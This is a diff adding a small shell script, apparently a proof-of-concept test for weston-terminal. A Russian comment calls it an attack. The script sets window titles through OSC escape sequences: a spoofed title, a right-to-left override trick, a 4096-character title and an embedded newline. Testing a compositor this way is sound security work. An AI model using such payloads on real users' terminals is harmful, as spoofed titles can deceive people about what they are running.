@@ -1,0 +1,10 @@
+#!/bin/sh
+# weston-terminal переносит OSC-заголовок в xdg_toplevel.set_title — это и есть атака
+printf '\033]0;[space:money] fake\007'
+sleep 3
+printf '\033]0;\342\200\256 rewop\007'
+sleep 3
+printf '\033]0;%s\007' "$(awk 'BEGIN{while(i++<4096)printf "A"}')"
+sleep 3
+printf '\033]0;two\nlines\007'
+exec /bin/sh
